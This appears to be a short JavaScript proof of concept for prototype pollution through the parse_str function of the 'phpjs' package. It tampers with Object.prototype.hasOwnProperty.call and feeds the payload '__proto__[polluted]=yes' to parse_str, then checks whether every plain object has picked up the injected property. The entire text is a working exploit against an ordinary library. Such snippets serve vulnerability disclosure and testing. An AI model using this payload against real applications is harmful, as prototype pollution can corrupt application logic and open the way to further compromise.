Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const p = require('phpjs');
p.parse_str('__proto__[polluted]=yes', {});
console.log({}.polluted);